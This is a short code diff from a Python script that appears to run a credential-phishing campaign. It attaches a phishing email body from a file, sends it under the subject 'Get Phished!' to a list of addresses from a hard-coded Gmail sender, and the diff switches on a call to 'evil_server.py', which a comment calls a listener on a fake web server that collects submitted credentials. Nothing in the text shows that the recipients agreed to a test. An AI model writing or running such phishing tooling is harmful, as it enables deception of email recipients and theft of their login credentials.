@@ -116,13 +116,14 @@ if args.cid:
 FROM_ADDR = 'alexirion10@gmail.com'
 PASSWD = ''
 
+
 for email in email_list:
     print(email)
 
 msg = MIMEMultipart()
 msg['From'] = FROM_ADDR
 msg['Subject'] = 'Get Phished!'
-phish_mail_file = open('phishing-email.txt', 'rb')
+phish_mail_file = open('phishing_email.txt', 'rb')
 msg.attach(MIMEText(phish_mail_file.read()))
 phish_mail_file.close()
 
@@ -141,7 +142,8 @@ server.quit()
 #####################################
 # listener for clicked submit buttons on our fake web server
 # ####################################
-# call(['python3', 'evil_server.py'])
+print('!!! Starting server to listen for credentials !!!')
+call(['python3', 'evil_server.py'])
 
 
 #####################################
